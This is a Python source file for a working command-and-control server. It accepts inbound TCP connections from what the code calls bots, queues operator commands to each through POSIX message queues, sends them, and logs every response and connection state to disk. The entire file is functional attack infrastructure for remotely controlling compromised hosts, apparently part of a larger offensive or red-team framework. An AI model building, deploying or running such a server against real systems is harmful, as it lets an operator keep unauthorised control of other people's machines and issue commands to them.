import socketserver
import socket
import uuid
import os
import time
import json
import threading
import posix_ipc


base_dir = '/usr/src/app/c2/connections/'
hello_log = '/hello_log'
lock_name = '/connections_lock'


class InvalidConnUUID(Exception):
    pass


class NotAliveConnection(Exception):
    pass


class ConnectionStorage:
    def __init__(self):
        with open(os.path.join(base_dir, 'connections.json'), 'r') as f:
            self.connections = json.load(f)

    def sync(self):
        semaphore = posix_ipc.Semaphore(lock_name, flags=posix_ipc.O_CREAT, initial_value=1)
        semaphore.acquire()
        with open(os.path.join(base_dir, 'connections.json'), 'r') as f:
            saved_connections = json.load(f)
        saved_connections.update(self.connections)
        # synchronize with other instances
        self.connections.update(saved_connections)
        with open(os.path.join(base_dir, 'connections.json'), 'w') as f:
            json.dump(saved_connections, f, default=str)
        semaphore.release()


class C2TCPHandler(socketserver.BaseRequestHandler):
    def handle(self) -> None:
        connectionStorage = ConnectionStorage()
        conn_uuid = uuid.uuid4().hex
        conn_folder = base_dir + conn_uuid
        os.mkdir(conn_folder)
        mq = posix_ipc.MessageQueue(f'/{conn_uuid}', flags=posix_ipc.O_CREAT)
        connectionStorage.connections[conn_uuid] = {'last_seen': time.time(), 'num_commands': 0,
                                                    'is_alive': True, 'client_addr': self.client_address}
        connectionStorage.sync()
        log_file = conn_folder + hello_log
        hello = self.request.recv(6).strip()
        log_handler = open(log_file, 'wb')
        log_handler.write(hello)
        log_handler.close()
        close = False
        while not close:
            command = mq.receive()[0]
            # command = command.encode()
            self.request.sendall(command + b'\n')
            log_file = conn_folder + f'/command_{connectionStorage.connections[conn_uuid]["num_commands"]}'
            log_handler = open(log_file, 'wb')
            log_handler.write(command + b'\n')
            if b'close' in command:
                close = True
            else:
                # TODO: per-command logic
                n_received, receiving = 0, True
                original_timeout = self.request.gettimeout()
                while receiving:
                    try:
                        # wait a second that more data is available
                        time.sleep(1)
                        data = self.request.recv(4096)
                        log_handler.write(data)
                        connectionStorage.connections[conn_uuid]['last_seen'] = time.time()
                        n_received += 1
                        # decrease timeout for the next receives
                        self.request.settimeout(2)
                    except (TimeoutError, socket.timeout):
                        if n_received == 0:
                            data = b"\n[*] Connection closed for timeout error\n"
                            log_handler.write(data)
                            close = True
                        else:
                            self.request.settimeout(original_timeout)
                        receiving = False
            log_handler.close()
            connectionStorage.connections[conn_uuid]['num_commands'] += 1
            connectionStorage.sync()
        connectionStorage.connections[conn_uuid]['is_alive'] = False
        connectionStorage.sync()


def start_multithreaded_c2(config):
    with open(os.path.join(base_dir, 'connections.json'), 'r') as f:
        connections = json.load(f)
    # if the C2 handler of a connection crashes, it may incorrectly result that the saved connection is alive
    for conn_uuid in connections:
        connections[conn_uuid]['is_alive'] = False
    with open(os.path.join(base_dir, 'connections.json'), 'w') as f:
        json.dump(connections, f, default=str)
    host, port = '0.0.0.0', config['c2_port']
    server = socketserver.ThreadingTCPServer((host, port), C2TCPHandler)
    server.timeout = config['c2_bot_timeout']
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.start()
    return server


def list_c2_connections():
    connectionStorage = ConnectionStorage()
    connections = connectionStorage.connections
    conn_tuples = []
    for conn_uuid in connections:
        client_addr = connections[conn_uuid]['client_addr']
        last_seen = connections[conn_uuid]['last_seen']
        is_alive = connections[conn_uuid]['is_alive']
        num_commands = connections[conn_uuid]['num_commands']
        conn_tuples.append((conn_uuid, client_addr, last_seen, is_alive, num_commands))
    return conn_tuples


def send_c2_command(conn_uuid, command):
    connectionStorage = ConnectionStorage()
    connections = connectionStorage.connections
    if conn_uuid not in connections:
        raise InvalidConnUUID
    if not connections[conn_uuid]['is_alive']:
        raise NotAliveConnection
    mq_name = f'/{conn_uuid}'
    mq = posix_ipc.MessageQueue(mq_name)
    mq.send(command)


def read_c2_log(conn_uuid, index=None):
    connectionStorage = ConnectionStorage()
    connections = connectionStorage.connections
    if conn_uuid not in connections:
        raise InvalidConnUUID
    if index is None:
        conn_folder = base_dir + conn_uuid
        log_file = conn_folder + hello_log
        with open(log_file, 'rb') as f:
            data = f.read()
    else:
        try:
            index = int(index)
            if index < 0:
                return "Index must be positive"
            if index >= connections[conn_uuid]['num_commands']:
                return "Index must be less than the number of completed commands"
            conn_folder = base_dir + conn_uuid
            log_file = conn_folder + f'/command_{index}'
            with open(log_file, 'rb') as f:
                data = f.read()
        except ValueError:
            return "Invalid index"
    data = data.decode(errors='replace')
    return data
